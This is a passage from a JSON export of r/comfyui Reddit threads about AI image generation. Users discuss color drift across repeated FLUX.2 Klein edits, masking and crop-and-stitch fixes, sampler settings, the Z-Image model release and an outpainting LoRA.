              "text": "Havent tested it on a real image, but i believe once its processed by ai, it would start to have the same issue of one tries to edit it again and again.",
              "score": 1,
              "created_utc": "2026-01-23 05:40:30",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o17a5sa",
          "author": "magik111",
          "text": "for me sometimes help add to prompt \"Strictly preserve all original colors from the photo, maintain exact color tones, saturation, and hues without any changes. Be completely consistent with the photo's color palette throughout the entire image\"",
          "score": 3,
          "created_utc": "2026-01-23 07:51:02",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o17cuiw",
          "author": "TBG______",
          "text": "Colorshifts in Diffusion + VAE workflows in ComfyUI mainly originate from three technical sources.\n\n\n1. Model capacity and reconstruction error\n\nEvery diffusion model has limited capacity to perfectly reconstruct image content. During iterative, these reconstruction errors accumulate. This becomes most visible in uniform, low-entropy regions such as pure black, gray, or white areas. The observed color shift is therefore not random noise, but the model‚Äôs inability to exactly reproduce flat tonal regions across generations.\n\n2. Inpainting and differential diffusion leakage\n\nInpainting introduces unavoidable leakage, even when differential diffusion is implemented directly within the model. Color and sharpness changes are not confined to the masked region, they also affect unmasked areas.\nEven with a fully black (0) mask, subtle changes can be observed outside the intended edit region. Increasing the number of inpainting steps amplifies this effect, causing gradual drift in color and detail both inside and near the mask boundaries.\n\n3. VAE encoding and decoding shifts\n\nVAE-induced color shifts are a well-known issue and have already been thoroughly documented. Any pixel-to-latent and latent-to-pixel conversion introduces small but cumulative deviations in color and contrast.\n\nUsing tiled VAE encoding/decoding generally produces better local color stability compared to full-frame VAE passes, especially at high resolutions. However, tiled VAEs introduce small rounding and boundary errors at tile borders. More details here : https://www.patreon.com/posts/147809146\n\nThere is only one reliable method to exactly maintain image content:\nDo not pass it through the sampler.\n\nThis makes crop-and-stitch workflows essential. Ideally, these operations should happen entirely in pixel space, using the original image data. Even a single VAE encode/decode pass alters the image, so avoiding unnecessary latent conversions is critical when preservation is required.\n\nIn the TBG ETUR Enhanced Tiled Upscaler and Refiner, these principles are fully automated:\n\t‚Ä¢\tCrop-and-stitch handling\n\t‚Ä¢\tVAE correction\n\t‚Ä¢\tLanpaint\n\t‚Ä¢\tMulti-object editing in a single pass\n\nThis allows you to modify many separate objects while keeping the background fully intact.\n\nHow it works\n\nYou can either:\n\t‚Ä¢\tUse the SAM segmentation nodes, or\n\t‚Ä¢\tManually mask all target elements\n\nPass the masks and the input image through the Upscaler and Tiler node with:\n\t‚Ä¢\tUpscale = None\n\t‚Ä¢\tPreset = Full Image\n\nThis configuration converts the workflow into an advanced inpainting pipeline, rather than a tiled upscaler.\n\nThe ‚ÄúETUR Tile Overrides‚Äù node enables:\n\t‚Ä¢\tAutomatic prompt generation\n\t‚Ä¢\tPer-segment prompt assignment\n\t‚Ä¢\tAdditional conditioning per selected element\n\nThe Refiner then applies all modifications while preserving the background. Optionally, the background itself can be refined in the same pass if desired.\n\nThis workflow has been tested with:\n\t‚Ä¢\tFlux, Qwen,ZIT,SD,SDXL,CHROMA\n\t‚Ä¢\tFlux Inpaint\n\t‚Ä¢\tFlux Kontext\n\nIt has not yet been tested with Flux2 Klein, but it should work similarly. Alternatively, a manual crop-and-stitch approach can be used to achieve comparable results.\n\nCore rule\n\nNever sample content that must remain unchanged.",
          "score": 3,
          "created_utc": "2026-01-23 08:15:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "o17fjnq",
              "author": "TBG______",
              "text": "This gives me an idea: I could add an inpainting-only mode switch to TBG ETUR. Let me know if this would be useful for you.",
              "score": 2,
              "created_utc": "2026-01-23 08:40:05",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o19cckj",
                  "author": "BathroomEyes",
                  "text": "I would find this very useful, thank you!",
                  "score": 1,
                  "created_utc": "2026-01-23 16:06:41",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o18elho",
              "author": "eagledoto",
              "text": "Will test with ZIT, thank you!",
              "score": 1,
              "created_utc": "2026-01-23 13:19:15",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o16gj3n",
          "author": "alsshadow",
          "text": "Looks funny",
          "score": 2,
          "created_utc": "2026-01-23 04:08:26",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o16r5js",
          "author": "admajic",
          "text": "I use the two image workflow. Put both images in. In image 2 I color the parts I don't want it to touch in red. Then prompt what I want it to do",
          "score": 2,
          "created_utc": "2026-01-23 05:17:58",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o16tlek",
          "author": "mac404",
          "text": "You should be able to fairly easily make all 3 of those changes in a single prompt.  \n\nDoing multiple VAE Encode/Decode passes will degrade the quality over time, but not necessarily to the degree you see here. You will see a color shift with every gen, but it should be only noticeable when doing more intense back-and-forth comparisons (whereas it's quite obvious here).  \n\nIn your example, after the first change you also already had some shifting / squishing of the image. This can happen sometimes, I've found it's usually a good idea to try 2-4 seeds with the same prompt and then pick the best one. You are also running at a resolution that is getting too high for Klein to handle well (1536 x 2752), and it will generally be much less stable because of that. I have generally found (although I haven't tested overly scientifically) that keeping the longest side below about 2k resolution will improve stability significantly when making changes. The model itself tends to output images that are so sharp / clear that I don't find the resolution limitation to actually be all that limiting.  \n\nNot perfect, but [here was the very first image I got](https://imgsli.com/NDQ0NTU4) when I tried with this prompt (after downloading the original PNG of your first image):  \n\n> Subject's shirt is black. Remove the subject's earrings. Remove the people from the background. Keep the subject‚Äôs pose and framing unchanged.  \n\nBecause the res is so high, you still get a little bit of squashing/stretching that's noticeable in the face. Maybe it would be perfect in a different seed if you tried a few. Hair color is slightly darker and the coffee cup also darkens slightly, but skin color stayed basically the same. There's a random out-of-focus person that got added into the background and a few other random changes, too. But not bad for literally the first try with a simple multi-change prompt.",
          "score": 2,
          "created_utc": "2026-01-23 05:35:30",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16zoud",
              "author": "eagledoto",
              "text": "yep definitely, I could do all that with a single prompt, but that was not my main focus, i was just playing around and noticed it as i didn't know about the color shifting.\n\nRegarding resolution, yes i believe its odd and pretty high.\n\nThe output you got is pretty decent yes.\n\nThank you for the detailed comment. Means alot!",
              "score": 1,
              "created_utc": "2026-01-23 06:22:12",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1725sj",
                  "author": "mac404",
                  "text": "Sure! And gotcha, makes sense.  \n\nAnother random note on prompting - basically anything you mention in the prompt will get changed in some way. You can always try variations on \"Keep ___ unchanged\" and it will often work pretty well.  And as weird as it feels, I find just puttring \"[object] is [color]\" can work better than \"change [color] to [other color]\". \"Remove\" and \"replace\" are pretty good prompt words, though.",
                  "score": 2,
                  "created_utc": "2026-01-23 06:42:22",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1728ai",
          "author": "Downtown-Bat-5493",
          "text": "*Quality degradation with each pass. \n\n\nJust compare her face in first image to the last.",
          "score": 2,
          "created_utc": "2026-01-23 06:42:55",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1742jb",
          "author": "Amirferdos",
          "text": "Don‚Äôt think about the VAE, it‚Äôs working good in 4B model.\nSo the problem is in 9B model",
          "score": 2,
          "created_utc": "2026-01-23 06:57:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1msa6l",
              "author": "eagledoto",
              "text": "Ah, will test it out",
              "score": 1,
              "created_utc": "2026-01-25 15:34:26",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1880od",
          "author": "Aromatic-Somewhere29",
          "text": "You can disable all groups except the first one and rerun the workflow until you get the result you want. Then, lock the seed, enable the second group, and repeat the process. You can copy and paste the last group to extend the chain. \n\nhttps://preview.redd.it/nh8qo9dwo3fg1.png?width=6121&format=png&auto=webp&s=e15e5c3ded9cad14674dd1acf0058b57adc7550c",
          "score": 2,
          "created_utc": "2026-01-23 12:38:50",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18eh8m",
              "author": "eagledoto",
              "text": "Thank you will try it out",
              "score": 1,
              "created_utc": "2026-01-23 13:18:36",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o18gv12",
                  "author": "Aromatic-Somewhere29",
                  "text": "I'm not sure if the workflow saved properly, here's a second attempt with small refinements. Looks like Reddit converts .png to .webp and removes the embedded workflow. I‚Äôve uploaded the .json file here: [https://pastebin.com/pqQfeHLD](https://pastebin.com/pqQfeHLD)\n\nhttps://preview.redd.it/2lpuhok6r3fg1.png?width=5874&format=png&auto=webp&s=5176e79bbee7a784170182a93318d76452b0a6a4",
                  "score": 2,
                  "created_utc": "2026-01-23 13:31:44",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1ee9vm",
                  "author": "Aromatic-Somewhere29",
                  "text": "Have you had a chance to try it? I‚Äôm curious whether it helped streamline your workflow.\n\nThe main idea here is to avoid the kind of manual overhead described in that long comment - things like saving intermediate latent files, digging through folders to find the right one, copying and pasting them back into the graph, and reloading just to make a tiny adjustment. That approach works in a pinch, but it‚Äôs not how latent-space editing was really meant to be used within a single, continuous generation task.\n\nIn ComfyUI the standard and most efficient approach for iterative refinement is chaining KSamplers and passing the latent directly from one to the next. This keeps everything in memory, avoids file clutter, and lets you isolate each edit step cleanly.\n\nThat‚Äôs exactly what this workflow does: each KSampler handles one specific change (e.g., pose, lighting, expression), and the latent flows sequentially down the chain. You can disable all but the first group, iterate until you‚Äôre happy, lock the seed, then move on to the next stage - all without ever touching the filesystem.\n\nIt‚Äôs a bit wordy, I know, but maybe my take on this gets missed because it hasn‚Äôt been explained in enough detail.",
                  "score": 1,
                  "created_utc": "2026-01-24 09:27:25",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o191o87",
          "author": "TekaiGuy",
          "text": "Edit models are always destructive which is why I don't even bother with them.",
          "score": 2,
          "created_utc": "2026-01-23 15:18:05",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1mq3b0",
              "author": "Comfortable_Swim_380",
              "text": "Probably good advice. The custom wan ones I tried for example just blow up the workflow. Dont even work.",
              "score": 1,
              "created_utc": "2026-01-25 15:24:12",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1f2vzy",
          "author": "TBG______",
          "text": "I propose a potential solution that replaces the unedited areas with the corresponding regions from the original image to prevent degradation: [https://www.reddit.com/r/comfyui/comments/1qkog35/comment/o1f292l/?utm\\_source=share&utm\\_medium=web3x&utm\\_name=web3xcss&utm\\_term=1&utm\\_content=share\\_button](https://www.reddit.com/r/comfyui/comments/1qkog35/comment/o1f292l/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button) \\- After testing it with SAM, which requires manual input of elements, I‚Äôve created a new node that can automatically detect the affected areas without SAM, allowing the process to be fully automated.\n\nHowever, I noticed that many contour edges are affected in the output of the sampler. This could make the issue a bit tricky to resolve. The new TBG Difference Mask node compares two images, mixes SSIM (structure) and RGB difference (color), then thresholds and area-filters to isolate real, coherent changes (like a shirt swap) while ignoring tiny model artifacts and noise.\n\nTBG Takeaways with the new TBG Difference Mask node are now uploaded and accessible from the Manager. The workflow for the SAM and Diff nodes can be found here:¬†[https://www.patreon.com/posts/149003920](https://www.patreon.com/posts/149003920)¬†(free access). SAM version works always but Diff Mask only if diff is significant.\n\nhttps://preview.redd.it/tvi98fzloafg1.png?width=1336&format=png&auto=webp&s=3b28ffe8b7e40aee43b6dd595bc72961dea63253",
          "score": 2,
          "created_utc": "2026-01-24 12:57:57",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1inhne",
              "author": "eagledoto",
              "text": "I got the workflow running till some extent, I am getting white edges around the shirt no matter how much i play with the mask settings, is there any way to perfectly mask the shirt?",
              "score": 1,
              "created_utc": "2026-01-24 23:17:21",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1iqt1w",
                  "author": "TBG______",
                  "text": "You need to extend the mask area beyond the blur margin. Besides that I tested different edits: shirts works, but more subtle changes still require manual masking, so it‚Äôs not a perfect workaround, just a starting point.",
                  "score": 2,
                  "created_utc": "2026-01-24 23:34:39",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1iopis",
                  "author": "eagledoto",
                  "text": "https://preview.redd.it/htip1b6esdfg1.png?width=752&format=png&auto=webp&s=165a61ea8ecc92af00fd42b15c47d8388157a0ed\n\n[https://pastebin.com/Lh8YbrKM](https://pastebin.com/Lh8YbrKM) these are the workflow settings",
                  "score": 1,
                  "created_utc": "2026-01-24 23:23:36",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o173w2b",
          "author": "Rude_Dependent_9843",
          "text": "In my experience, I've found that this depends on the seed. Since the distilled model, according to FL Studio, already exhibits less variability, what I do is add a seed randomization module: I use Easy Seed (I've also added RGthree Seed, but for some reason it makes the flow heavier). Because generation is fast, I run some tests, and let's say 1 out of every 3 results has a balanced color correction.",
          "score": 1,
          "created_utc": "2026-01-23 06:56:29",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1747f3",
              "author": "eagledoto",
              "text": "Regarding seed, the seed doesnt change every time I generate something, it's set to randomized but I believe I am looking at a different seed? It's the noise seed something, sorry I am on my phone so I can't tell you what it was exactly",
              "score": 1,
              "created_utc": "2026-01-23 06:59:05",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o17ap59",
          "author": "StableLlama",
          "text": "My main observation is that it gives the image warmer colors.\n\nAnyway, when the colors and saturation isn't kept, actually when the values of the not edited pixels isn't kept it's bad.\n\nIMHO there are two ways to solve it:\n\n* Train the model better. (My guess is, that the VAE doesn't keep the error function. I.e. a pixel change resulting in a Delta E and luminosity change of \"err\" should create after the same change in latent space also an error of \"err\". Most likely the VAE wasn't trained with that constraint). But that's nothing you can do.\n* Use masking. Only allow the model to change the pixels you are allowing it to, the others are prevent from changing with a mask.\n\nWith tools like Krita AI it's very simple to mask the area that is allowed to change. With Comfy itself you need to adapt your workflow.",
          "score": 1,
          "created_utc": "2026-01-23 07:55:54",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o19lgxg",
          "author": "Comfortable_Swim_380",
          "text": "Your scheduler can be causing that I would try something more advanced",
          "score": 1,
          "created_utc": "2026-01-23 16:47:29",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1hh2gk",
              "author": "eagledoto",
              "text": "What If i use the default ksampler instead of this?\n\nhttps://preview.redd.it/qy84l2isqcfg1.png?width=622&format=png&auto=webp&s=f0181fb2af4772fbdf408a686e93c2ce1e1e6a01",
              "score": 2,
              "created_utc": "2026-01-24 19:53:22",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o1hgrxn",
              "author": "eagledoto",
              "text": "I am using the Flux2Scheduler, can you suggest anything else?",
              "score": 1,
              "created_utc": "2026-01-24 19:52:03",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1mp4p1",
                  "author": "Comfortable_Swim_380",
                  "text": "# Current Working Setup\n\n**For video:**  \n**2 Sampler Setup (ie WAN 2.2)**\n\n|Steps|Sampler|Scheduler|\n|:-|:-|:-|\n|0-15|res\\_multistep|beta57|\n|15-40|res\\_2s|beta 57|\n\n**1 Sampler Setup (ie WAN 2.1)**\n\n|Steps (Total)|Sampler|Scheduler|\n|:-|:-|:-|\n|0-35|res\\_2s/ unipc|beta57|\n\n**For image (ie FLUX):**\n\n|Steps (Total)|Sampler|Scheduler|\n|:-|:-|:-|\n|20-35|uni\\_pc (good for high detail)|beta57|\n|\\~20-30|eular (good for dramatic changes)|beta57|",
                  "score": 1,
                  "created_utc": "2026-01-25 15:19:45",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1dc20p",
          "author": "tarkansarim",
          "text": "That‚Äôs why I always use photoshop to only adopt the parts I‚Äôve changed onto the original image for local edits. Obviously that doesn‚Äôt work for global edits like lighting but that‚Äôs also not something you would do repeatedly on the same image.",
          "score": 1,
          "created_utc": "2026-01-24 04:15:20",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1gzxi6",
          "author": "Suitable-League-4447",
          "text": "is someone here having a solution for qwen edit 2509 or 2511 as it changes completely the face of the input image person and wondering if what is explained here could help? im working on pose transfer i2i workflow.",
          "score": 1,
          "created_utc": "2026-01-24 18:38:19",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1hepgl",
              "author": "eagledoto",
              "text": "Try out flux 2 edit, or qwen 2512.",
              "score": 1,
              "created_utc": "2026-01-24 19:42:47",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1lgkl9",
                  "author": "Suitable-League-4447",
                  "text": "wdym by flux2 edit? there's not edit version of flux2 u meant klein?",
                  "score": 1,
                  "created_utc": "2026-01-25 10:22:22",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o16hvpt",
          "author": "Key-Tension1528",
          "text": "All models have some sort of bias and do this. If you repeat enough times the bias will make it drift into nonsense. You could try passing it through a color match node with the original image.",
          "score": 0,
          "created_utc": "2026-01-23 04:16:42",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16u5cx",
              "author": "eagledoto",
              "text": "https://preview.redd.it/r94ndihld1fg1.png?width=1173&format=png&auto=webp&s=093afeebace3bfb939581678389af7bac1b18606\n\nAm i supposed to do it like this? sorry m a noob at this, started a few days ago.",
              "score": 1,
              "created_utc": "2026-01-23 05:39:34",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o16q9ku",
          "author": "TomorrowNeverKnowss",
          "text": "Other than the increased saturation, that actually looks really good. Can you share your workflow?",
          "score": 1,
          "created_utc": "2026-01-23 05:11:51",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16tr2w",
              "author": "eagledoto",
              "text": "I am using the default workflow from here, everything should be there if you want to download.\n\n[https://docs.comfy.org/tutorials/flux/flux-2-klein](https://docs.comfy.org/tutorials/flux/flux-2-klein)",
              "score": 2,
              "created_utc": "2026-01-23 05:36:39",
              "is_submitter": true,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qkzn9g",
      "title": "[Node Release] ComfyUI Node Organizer",
      "subreddit": "comfyui",
      "url": "https://v.redd.it/cdtt6m19b5fg1",
      "author": "PBandDev",
      "created_utc": "2026-01-23 19:01:25",
      "score": 82,
      "num_comments": 2,
      "upvote_ratio": 0.98,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Show and Tell",
      "permalink": "https://reddit.com/r/comfyui/comments/1qkzn9g/node_release_comfyui_node_organizer/",
      "domain": "v.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "o1ldgww",
          "author": "leftclot",
          "text": "Ugh. Finally.",
          "score": 2,
          "created_utc": "2026-01-25 09:54:53",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qohtd6",
      "title": "Z IMAGE IS HERE!!",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/r/comfyui/comments/1qohtd6/z_image_is_here/",
      "author": "MountainPollution287",
      "created_utc": "2026-01-27 16:00:35",
      "score": 81,
      "num_comments": 35,
      "upvote_ratio": 0.89,
      "text": "[https://huggingface.co/Tongyi-MAI/Z-Image](https://huggingface.co/Tongyi-MAI/Z-Image)",
      "is_original_content": false,
      "link_flair_text": "News",
      "permalink": "https://reddit.com/r/comfyui/comments/1qohtd6/z_image_is_here/",
      "domain": "self.comfyui",
      "is_self": true,
      "comments": [
        {
          "id": "o21esyk",
          "author": "KoopaSweatsInShell",
          "text": "LoRA time!",
          "score": 14,
          "created_utc": "2026-01-27 16:15:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "o21fh6n",
              "author": "Whipit",
              "text": "I've been patiently waiting. Z-image turbo loras has always been a bit wonky.\n\nIt won't be right away but IMAGINE the finetunes that are coming! ;o",
              "score": 12,
              "created_utc": "2026-01-27 16:18:54",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o21u927",
                  "author": "KoopaSweatsInShell",
                  "text": "Bruh, I am tickled. I think it is also going to give us a lot of insight to how Z-Image works under the hood by examining the inputs and outputs in LoRAs and clip modifications.",
                  "score": 2,
                  "created_utc": "2026-01-27 17:22:45",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o26r61u",
              "author": "AcetaminophenPrime",
              "text": "My Loras turned out worse with identical training parameters for Omni than they did with Turbo",
              "score": 1,
              "created_utc": "2026-01-28 09:45:39",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o288t4r",
              "author": "ANR2ME",
              "text": "Does ZIT lora works on the base too? ü§î",
              "score": 1,
              "created_utc": "2026-01-28 15:26:45",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o21oe5m",
          "author": "Upbeat-Ad-2",
          "text": "What does this mean for a newbie like me?",
          "score": 12,
          "created_utc": "2026-01-27 16:57:22",
          "is_submitter": false,
          "replies": [
            {
              "id": "o23obwa",
              "author": "SirTeeKay",
              "text": "It means say goodbye to your social life for one.",
              "score": 17,
              "created_utc": "2026-01-27 22:13:18",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o237vds",
              "author": "TekaiGuy",
              "text": "It's the SDXL of the new era. It can generate stable 2K resolution which XL mostly could not.",
              "score": 3,
              "created_utc": "2026-01-27 20:59:40",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o24bw2x",
                  "author": "Moist-Presentation42",
                  "text": "I'm confused .. wasn't z-image released on day 0 on comfyui (they had safetensors in Nov or Dec '25). Is the cool part now that they were converted to GGUFF format, which makes it easier to do lora training on? Sorry .. I'm also a newbie and am seriously trying to understand.",
                  "score": 0,
                  "created_utc": "2026-01-28 00:10:41",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o222yjw",
          "author": "cloutier85",
          "text": "what does this mean?",
          "score": 7,
          "created_utc": "2026-01-27 18:00:20",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o21cdj3",
          "author": "Whipit",
          "text": "FP8 version. 5 min or 10? ;)",
          "score": 3,
          "created_utc": "2026-01-27 16:05:24",
          "is_submitter": false,
          "replies": [
            {
              "id": "o21ei3x",
              "author": "mongini12",
              "text": "Who cares about fp8 - nunchaku is the way!",
              "score": 4,
              "created_utc": "2026-01-27 16:14:40",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o241cr9",
                  "author": "PuzzleheadedField288",
                  "text": "This guy fucks",
                  "score": 3,
                  "created_utc": "2026-01-27 23:16:38",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o21f56p",
                  "author": "Whipit",
                  "text": "FP8 works best on 4000 series GPUs",
                  "score": 1,
                  "created_utc": "2026-01-27 16:17:27",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o21kino",
              "author": "jib_reddit",
              "text": "You can just download the bf16 and then save it as fp8 if you want.",
              "score": 2,
              "created_utc": "2026-01-27 16:40:49",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o21jksj",
          "author": "Healthy-ICE8570",
          "text": "So explain to a noob whats up with Z Image, T2V only??",
          "score": 3,
          "created_utc": "2026-01-27 16:36:44",
          "is_submitter": false,
          "replies": [
            {
              "id": "o23om1n",
              "author": "SirTeeKay",
              "text": "T2I. It's the full undistilled model. No fine-tunes or shortcuts. Z-Image Turbo was distilled.",
              "score": 2,
              "created_utc": "2026-01-27 22:14:38",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o26a96l",
          "author": "MistySoul",
          "text": "Im hoping that unlike SDXL where it branched out into three subset families by different developers, the finetunes, LoRas, controlnets etc can orbit around the main Z image family models with decent Lora compatibility. Maybe some can get distilled, but with a domain specific distilled model you can probably still have diverse outputs if you are focusing on anime, just realistic etc. this way Loras can be a bit more universal and we don't need to train the same one three times for different bases.\n\nMaybe there are way smarter people who already have answers, but while I have finetuned SDXL models, I don't even know how to start with something like Z Image, probably entirely different ball game. It might take some time for the base tools to be developed, experiments on how to best fine-tune etc, and that will cost money so I don't expect a bunch to be on it right away. \n\nI think we'll have fun with the standard z image models for the next 3-6months then see some usable finetuned coming out.\n\nI am envious of NovelAI cause it does anime generation stunningly and I feel like Z Image has the potential, but it needs a whole bunch of anime knowledge. Maybe that's one fine-tune I can pursue once the tools have been established. Get it to know each anime intimately like NovelAI from 2026 right down to the 60s.\n\nAnd when I say fine tune I don't mean just Loras. Although Loras are great for a lot of things, sometimes you need the model to be foundationally trained towards things like this",
          "score": 1,
          "created_utc": "2026-01-28 07:13:03",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o27738y",
          "author": "inagy",
          "text": "I don't understand. Don't we have this already? Or that was just the Turbo model which got released a couple weeks ago?",
          "score": 1,
          "created_utc": "2026-01-28 11:59:14",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o286o43",
          "author": "ANR2ME",
          "text": "GGUF version at https://huggingface.co/unsloth/Z-Image-GGUF/\n\nFP8 (4 different versions) at https://huggingface.co/drbaph/Z-Image-fp8/",
          "score": 1,
          "created_utc": "2026-01-28 15:16:59",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o289aah",
          "author": "Hollow_Himori",
          "text": "Can you use z image turbo pictures for z image base lora training?",
          "score": 1,
          "created_utc": "2026-01-28 15:28:54",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o28g0ho",
          "author": "Iam-will",
          "text": "I am newbie here, please show me how to install this from the huggingface?",
          "score": 1,
          "created_utc": "2026-01-28 15:58:28",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o2965ec",
          "author": "Baddabgames",
          "text": "Would love to see a Z-Image + Chroma fine-tune.",
          "score": 1,
          "created_utc": "2026-01-28 17:51:48",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o22sfi4",
          "author": "m4ddok",
          "text": "on my humble 4070 TiS 16Gb the time taken for a 1080p image is really long, more or less 110s (default recommended settings, 25 steps 4.0 cfg, res\\_multistep simple), I'm not used to it anymore, I hope for some lightning-LoRA.\n\nFrom a couple of tests I ran with the same prompt I used for testing with z-image turbo, the poor image quality is evident, although the model is clearly much more varied, but also more stable. It will be an excellent workhorse for LoRA.",
          "score": 1,
          "created_utc": "2026-01-27 19:50:07",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o22oa5r",
          "author": "Puzzleheaded_Fox5820",
          "text": "How do I download it?",
          "score": 0,
          "created_utc": "2026-01-27 19:31:36",
          "is_submitter": false,
          "replies": [
            {
              "id": "o23up4t",
              "author": "Soggy_Army5150",
              "text": "Everything you need is right here...\n\n[https://civitai.com/models/2342797?modelVersionId=2635223](https://civitai.com/models/2342797?modelVersionId=2635223)",
              "score": 3,
              "created_utc": "2026-01-27 22:43:39",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o246abm",
                  "author": "Puzzleheaded_Fox5820",
                  "text": "Awesome thanks!",
                  "score": 2,
                  "created_utc": "2026-01-27 23:41:54",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qnlj3q",
      "title": "High-consistency outpainting with FLUX.2 Klein 4B LoRA",
      "subreddit": "comfyui",
      "url": "https://i.redd.it/5cohb9j54qfg1.png",
      "author": "ilzg",
      "created_utc": "2026-01-26 16:53:26",
      "score": 78,
      "num_comments": 20,
      "upvote_ratio": 0.98,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Resource",
      "permalink": "https://reddit.com/r/comfyui/comments/1qnlj3q/highconsistency_outpainting_with_flux2_klein_4b/",
      "domain": "i.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "o1uttdy",
          "author": "Woisek",
          "text": "This would be awesome if it were for the 9b model. üòï",
          "score": 6,
          "created_utc": "2026-01-26 17:37:23",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1uz4bm",
              "author": "ilzg",
              "text": "I tried this, it's interesting, but 4b works better. But I will try again.",
              "score": 5,
              "created_utc": "2026-01-26 18:00:46",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1vro9m",
                  "author": "Woisek",
                  "text": "Please, I start to discover the 9b model and so far it's awesome.",
                  "score": 2,
                  "created_utc": "2026-01-26 20:01:50",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o2dqxwt",
                  "author": "Woisek",
                  "text": "I just try to use it with the 4b model... and I can't get it to work. Neither with a \"normal\", simple workflow, nor with an inpaint workflow. It just doesn't do anything. ü§∑‚Äç‚ôÇÔ∏è",
                  "score": 1,
                  "created_utc": "2026-01-29 09:18:34",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1uuzqc",
              "author": "Delicious_Source_496",
              "text": "agree",
              "score": 1,
              "created_utc": "2026-01-26 17:42:45",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o2dgzrd",
              "author": "theOliviaRossi",
              "text": "exactly!!!",
              "score": 1,
              "created_utc": "2026-01-29 07:46:20",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1vjppu",
          "author": "spacemidget75",
          "text": "I found it works amazing at outpainting out of the box too. I just adding a padding node and it fills it in.",
          "score": 4,
          "created_utc": "2026-01-26 19:27:20",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1xbw5a",
              "author": "Mirandah333",
              "text": "Yes! Generally it works out of the box, never thought could need a lora for that (at least with 9b)",
              "score": 1,
              "created_utc": "2026-01-27 00:25:56",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1ulw94",
          "author": "Odd-Mirror-2412",
          "text": "Thank you!",
          "score": 3,
          "created_utc": "2026-01-26 17:03:08",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1yw4lr",
          "author": "Synchronauto",
          "text": "Is there a workflow to go with this?",
          "score": 2,
          "created_utc": "2026-01-27 05:57:21",
